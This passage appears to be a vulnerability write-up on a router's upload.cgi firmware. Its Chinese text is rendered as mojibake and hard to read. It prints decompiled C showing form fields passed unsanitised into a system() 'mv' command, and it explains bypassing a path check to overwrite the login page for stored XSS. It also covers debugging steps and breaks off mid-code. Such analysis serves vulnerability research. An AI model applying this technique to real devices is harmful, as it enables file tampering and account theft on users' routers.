class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *CONTENT_LENGTH_addr; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">char</span> *CONTENT_TYPE_addr; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> *REQUEST_URI_addr; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">char</span> *HTTP_COOKIE_addr; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// r0</span></span><br><span class="line">  _BYTE *v8; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">void</span> *v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">size_t</span> v13; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v15; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v26; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *haystack; <span class="comment">// [sp+14h] [bp-464h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [sp+18h] [bp-460h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v30; <span class="comment">// [sp+1Ch] [bp-45Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [sp+20h] [bp-458h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [sp+24h] [bp-454h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [sp+28h] [bp-450h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v34; <span class="comment">// [sp+2Ch] [bp-44Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v35; <span class="comment">// [sp+30h] [bp-448h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v36; <span class="comment">// [sp+34h] [bp-444h] BYREF</span></span><br><span class="line">  <span class="type">int</span> boundary; <span class="comment">// [sp+38h] [bp-440h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v38; <span class="comment">// [sp+3Ch] [bp-43Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> v39; <span class="comment">// [sp+40h] [bp-438h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v40[<span class="number">7</span>]; <span class="comment">// [sp+44h] [bp-434h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1048</span>]; <span class="comment">// [sp+60h] [bp-418h] BYREF</span></span><br><span class="line"></span><br><span class="line">  CONTENT_LENGTH_addr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_LENGTH&quot;</span>);</span><br><span class="line">  CONTENT_TYPE_addr = <span class="built_in">getenv</span>(<span class="string">&quot;CONTENT_TYPE&quot;</span>);</span><br><span class="line">  REQUEST_URI_addr = <span class="built_in">getenv</span>(<span class="string">&quot;REQUEST_URI&quot;</span>);</span><br><span class="line">  HTTP_COOKIE_addr = <span class="built_in">getenv</span>(<span class="string">&quot;HTTP_COOKIE&quot;</span>);</span><br><span class="line">  v7 = <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>u);</span><br><span class="line">  haystack = <span class="number">0</span>;</span><br><span class="line">  v29 = <span class="number">0</span>;</span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  v34 = <span class="number">0</span>;</span><br><span class="line">  v35 = <span class="number">0</span>;</span><br><span class="line">  v36 = <span class="number">0</span>;</span><br><span class="line">  boundary = <span class="built_in">StrBufCreate</span>((<span class="type">int</span>)v7);</span><br><span class="line">  v38 = <span class="built_in">StrBufCreate</span>(boundary);</span><br><span class="line">  v39 = <span class="built_in">StrBufCreate</span>(v38);</span><br><span class="line">  <span class="keyword">if</span> ( CONTENT_LENGTH_addr )</span><br><span class="line">    CONTENT_LENGTH_addr = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">atoi</span>(CONTENT_LENGTH_addr);</span><br><span class="line">  v8 = <span class="built_in">malloc</span>((<span class="type">size_t</span>)(CONTENT_LENGTH_addr + <span class="number">1</span>));</span><br><span class="line">  v8[<span class="built_in">fread</span>(v8, <span class="number">1u</span>, (<span class="type">size_t</span>)CONTENT_LENGTH_addr, (FILE *)_bss_start)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( CONTENT_TYPE_addr &amp;&amp; <span class="built_in">strstr</span>(CONTENT_TYPE_addr, <span class="string">&quot;boundary=&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">StrBufSetStr</span>(boundary, <span class="string">&quot;--&quot;</span>);</span><br><span class="line">    v9 = <span class="built_in">strstr</span>(CONTENT_TYPE_addr, <span class="string">&quot;boundary&quot;</span>);</span><br><span class="line">    <span class="built_in">StrBufAppendStr</span>(boundary, v9 + <span class="number">9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = <span class="built_in">memset</span>(v40, <span class="number">0</span>, <span class="built_in">sizeof</span>(v40));</span><br><span class="line">  v40[<span class="number">1</span>] = (<span class="type">int</span>)sub_1138C;</span><br><span class="line">  v40[<span class="number">2</span>] = (<span class="type">int</span>)sub_11464;</span><br><span class="line">  dword_2348C = <span class="built_in">json_object_new_object</span>(v10);</span><br><span class="line">  v11 = <span class="built_in">StrBufToStr</span>(boundary);</span><br><span class="line">  v12 = <span class="built_in">multipart_parser_init</span>(v11, v40);</span><br><span class="line">  v13 = <span class="built_in">strlen</span>(v8);</span><br><span class="line">  <span class="built_in">multipart_parser_execute</span>(v12, v8, v13);</span><br><span class="line">  <span class="built_in">multipart_parser_free</span>(v12);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v29, <span class="string">&quot;\&quot;file.path\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;haystack, <span class="string">&quot;\&quot;filename\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v30, <span class="string">&quot;\&quot;pathparam\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v31, <span class="string">&quot;\&quot;fileparam\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v32, <span class="string">&quot;\&quot;destination\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v33, <span class="string">&quot;\&quot;option\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v34, <span class="string">&quot;\&quot;cert_name\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v35, <span class="string">&quot;\&quot;cert_type\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">jsonutil_get_string</span>(dword_2348C, &amp;v36, <span class="string">&quot;\&quot;password\&quot;&quot;</span>, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( HTTP_COOKIE_addr )</span><br><span class="line">    <span class="built_in">get_strtok_value</span>(HTTP_COOKIE_addr, <span class="string">&quot;sessionid=&quot;</span>, <span class="string">&quot;;&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( !v29 || <span class="built_in">match_regex</span>(<span class="string">&quot;^/tmp/upload/[0-9]&#123;10&#125;$&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content-type: text/html\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Error Input&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">StrBufSetStr</span>(v39, v31);</span><br><span class="line">  v14 = haystack;</span><br><span class="line">  <span class="keyword">if</span> ( haystack )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strstr</span>(haystack, <span class="string">&quot;.xml&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = <span class="string">&quot;Configuration&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(v14, <span class="string">&quot;.img&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">StrBufSetStr</span>(v39, v14);</span><br><span class="line">        <span class="keyword">goto</span> LABEL_18;</span><br><span class="line">      &#125;</span><br><span class="line">      v15 = <span class="string">&quot;Firmware&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v30 = v15;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_18:</span><br><span class="line">  v16 = v29;</span><br><span class="line">  v17 = (<span class="type">int</span>)v30;</span><br><span class="line">  v18 = <span class="built_in">StrBufToStr</span>(v39);</span><br><span class="line">  v19 = <span class="built_in">sub_115EC</span>(v17, v16, v18);</span><br><span class="line">  <span class="keyword">if</span> ( v19 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Content-type: text/html\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Error Input&quot;</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( v19 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">        v26 = <span class="string">&quot;Configure upload fail&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">        v26 = <span class="string">&quot;The length of filename is greater than 128&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">        v26 = <span class="string">&quot;The filename is illegal, only support &#x27;a-z&#x27; &#x27;A-Z&#x27; &#x27;0-9&#x27; &#x27;_&#x27; &#x27;.&#x27; &#x27;-&#x27;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(v26);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(REQUEST_URI_addr, <span class="string">&quot;/api/operations/ciscosb-file:form-file-upload&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v20 = (<span class="type">int</span>)v30;</span><br><span class="line">    v21 = <span class="built_in">StrBufToStr</span>(v39);</span><br><span class="line">    <span class="built_in">sub_125A8</span>(s, v20, v21, v29);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(REQUEST_URI_addr, <span class="string">&quot;/upload&quot;</span>) &amp;&amp; !<span class="built_in">match_regex</span>(<span class="string">&quot;^[A-Fa-f0-9]&#123;64&#125;$&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v22 = v32;</span><br><span class="line">    v23 = v33;</span><br><span class="line">    v24 = (<span class="type">int</span>)v30;</span><br><span class="line">    v25 = <span class="built_in">StrBufToStr</span>(v39);</span><br><span class="line">    <span class="built_in">sub_1277C</span>(s, v22, v23, v24, v25, v34, v35, v36);</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_31:</span><br><span class="line">  <span class="built_in">free</span>(v8);</span><br><span class="line">  <span class="built_in">StrBufFree</span>(&amp;v38);</span><br><span class="line">  <span class="built_in">StrBufFree</span>(&amp;boundary);</span><br><span class="line">  <span class="built_in">StrBufFree</span>(&amp;v39);</span><br><span class="line">  <span class="built_in">json_object_put</span>(dword_2348C);</span><br><span class="line">  <span class="built_in">SYSTEM</span>(<span class="string">&quot;rm -f %s/* &gt; /dev/null 2&gt;&amp;1&quot;</span>, <span class="string">&quot;/tmp/upload&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¤§éƒ¨åˆ†çš„ä¿¡æ¯éƒ½æ˜¯æ²¡ç”¨çš„ï¼Œè®©æˆ‘ä»¬çœ‹æ¼æ´å‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_115EC</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2, <span class="type">const</span> <span class="type">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">bool</span> v3; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">316</span>]; <span class="comment">// [sp+Ch] [bp-13Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = a3 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    v3 = a1 == <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Firmware&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/firmware/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Configuration&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/configuration/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Certificate&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/in_certs/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Signature&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/signature/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;3g-4g-driver&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/3g-4g-driver/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;Language-pack&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/language-pack/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;User&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/user/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(a1, <span class="string">&quot;Portal&quot;</span>) )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    v8 = <span class="string">&quot;/tmp/www/&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">is_file_exist</span>(a2) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(a2) &gt; <span class="number">0x80</span> || <span class="built_in">strlen</span>(a3) &gt; <span class="number">0x80</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">match_regex</span>(<span class="string">&quot;^[a-zA-Z0-9_.-]*$&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-4</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;mv -f %s %s/%s&quot;</span>, a2, v8, a3);</span><br><span class="line">  <span class="built_in">debug</span>(<span class="string">&quot;cmd=%s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">if</span> ( !s[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  v9 = <span class="built_in">system</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v9 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">error</span>((<span class="type">int</span>)<span class="string">&quot;upload.cgi: %s(%d) Upload failed!&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;prepare_file&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)<span class="number">0xAD</span>);</span><br><span class="line">  <span class="keyword">return</span> v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°åˆ°æœ€åä¼šæ‰§è¡Œmv -f a2 v8&#x2F;a3</p><p>v8æ˜¯é€šè¿‡åˆ¤æ–­a1æ¥è·å¾—çš„ï¼Œa2å’Œa3åˆ†åˆ«éƒ½æ˜¯å‚æ•°</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331149.png" alt="image-20240811153815824"></p><p>a2æ¯”è¾ƒæ˜¾ç„¶æ˜¯é€šè¿‡file.pathè¡¨å•åç§°æ¥åŒ¹é…çš„</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331150.png" alt="image-20240811155117349"></p><p>a3ä¼šç¨å¾®å¤æ‚ä¸€ç‚¹ï¼Œfilenameè¡¨å•çš„å‚æ•°å¦‚æœå­˜åœ¨ä¸”ä¸åŒ…å«.imgçš„è¯ï¼Œé‚£ä¹ˆa3å°±æ˜¯filenameè¡¨å•ä¸‹çš„å‚æ•°ï¼Œå¦‚æœfilenameè¡¨å•ä¸‹ä¸ºç©ºçš„è¯ï¼Œé‚£ä¹ˆfileparamè¡¨å•ä¸‹çš„å‚æ•°å°±æ˜¯a3äº†ï¼Œæ˜¾ç„¶ç¬¬äºŒç§æ–¹æ³•æ§åˆ¶æ¯”è¾ƒç®€å•</p><p>ä½†æ˜¯å‘¢ï¼Œå¦‚æœåªæ˜¯åˆ°äº†è¿™é‡Œï¼Œé‚£ä¹ˆè¯¥æ¼æ´ä¹Ÿä¸ä¼šæœ‰ä»»ä½•çš„ä½œç”¨ï¼Œå¯æ˜¯å‘¢</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331151.png" alt="image-20240811180710241"></p><p>åœ¨è¿è¡Œçš„æ—¶å€™ä¼šå‘ç°<code>/www/login.html</code>å…¶å®æ˜¯è½¯è¿æ¥åˆ°<code>/tmp/www/login.html</code>çš„ï¼Œå› æ­¤åªéœ€è¦è¦†ç›–<code>/tmp/www/login.html</code>å°±èƒ½å®ç°å¯¹ç™»å½•é¡µé¢çš„ç¯¡æ”¹ï¼Œæœ€ç»ˆè¾¾åˆ°å­˜å‚¨å‹XSSæ”»å‡»çš„æ•ˆæœ</p><p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331152.png" alt="image-20240811223418049"></p><p>æ­¤æ—¶è¯¥åˆ¤å®šè¯¥å¦‚ä½•è·³è¿‡ï¼Œæ¥ä¸‹æ¥çš„åŠ¨æ€è°ƒè¯•ä¹Ÿä¼šè§£é‡Šè¿™ä¸ªé—®é¢˜</p><h2 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h2><p>ç”±äº<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331153.png" alt="image-20240811212606929"></p><p>è¿™ä¸€æ®µè¿‡äºçš„æŠ½è±¡ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è°ƒè¯•æ¥è§‚çœ‹æ•´ä¸ªè¿›ç¨‹</p><p>æˆ‘å‡†å¤‡é‡‡ç”¨çš„æ˜¯forkå­è¿›ç¨‹çš„æ–¹æ³•ï¼Œé¦–å…ˆä»¿çœŸæˆåŠŸä¹‹åï¼Œç”±äºè¯¥ç¨‹åºæ˜¯é€šè¿‡forkå­è¿›ç¨‹ç„¶åå†é€šè¿‡execvpæ¥æ‰§è¡Œupload.cgiç¨‹åºçš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331154.png" alt="image-20240811212043909"></p><p>åœ¨ç¨‹åºçš„å¼€å§‹æœ‰ä¸ªè‡ªå·±è·³è‡ªå·±ï¼Œé‚£ä¹ˆè¯¥å­è¿›ç¨‹å°±ä¼šä¸€ç›´åœ¨è¿™é‡Œæ‰§è¡Œï¼ŒåŒæ—¶åœ¨è°ƒè¯•å‡ºé”™ä¹Ÿå¯ä»¥é‡å¤è¿›è¡Œï¼Œå¯ä»¥è¯´æ˜¯å¾ˆæ–¹ä¾¿çš„æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331155.png" alt="image-20240811212337395"></p><p>ç„¶åä½¿ç”¨gdbserveré…åˆgdbè¿›è¡Œè°ƒè¯•ï¼Œçœ‹åˆ°æ­¤æ—¶æœ‰ä¸ªå­è¿›ç¨‹ï¼Œæ‰§è¡Œgdbserveré™„åŠ è¿›ç¨‹</p><p>åœ¨ä¸»æœºæ‰§è¡Œsudo gdb-multiarchï¼Œä¸€å®šè¦ç”¨sudoï¼Œå› ä¸ºä¹‹åè¦ä¿®æ”¹ç¨‹åºçš„æœºå™¨ç ï¼Œå¦‚æœä¸ç”¨rootæƒé™çš„è¯ï¼Œå› ä¸ºæ˜¯rxçš„æ‰€ä»¥ä¼šæ— æ³•ä¿®æ”¹</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331156.png" alt="image-20240811205926274"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331157.png" alt="image-20240811211106460"></p><p>ä¿®æ”¹å®Œæˆä¹‹åä¾¿æ˜¯å¯ä»¥çœ‹åˆ°ç¨‹åºæ­£å¸¸è¿›è¡Œï¼ŒåŒæ—¶è¿˜æ˜¯ä»å¼€å¤´æ‰§è¡Œçš„</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331158.png" alt="image-20240811211745827"></p><p>ç”±äºæˆ‘ä»¬çš„Postè¯·æ±‚æ˜¯</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331159.png" alt="image-20240811212926160"></p><p>æ‰€ä»¥è¿™é‡Œçš„å‡½æ•°å°±æ˜¯è¯»å–è¡¨å•å­—æ®µçš„å†…å®¹å­˜å‚¨åœ¨å˜é‡é‡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331160.png" alt="image-20240811223809098"></p><p>çœ‹åˆ°ä¸Šè¿°çš„æ‰§è¡Œæµèµ°åçš„æƒ…å†µï¼Œå‘ç°ä»–æ­£åˆ™åŒ¹é…çš„å¯¹è±¡æ˜¯file.pathçš„å†…å®¹</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331161.png" alt="image-20240811224044862"></p><p>è¿”å›å€¼ä¸º0ï¼Œæ‰€ä»¥ç»•è¿‡äº†æ£€æŸ¥ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°æ˜¯ä»€ä¹ˆå‘¢ï¼Œå¾ˆå¥½å¥‡</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331162.png" alt="image-20240811225228547"></p><p>å‘ç°åªè¦æ˜¯0-9å†…çš„10ä½æ•°éƒ½å¯ä»¥ç»•è¿‡æ£€æŸ¥ï¼Œä¹Ÿæ˜¯å¾ˆä¸é”™çš„</p><p>ä½†æ˜¯å‘¢ </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">is_file_exist</span>(a2) )</span><br><span class="line">  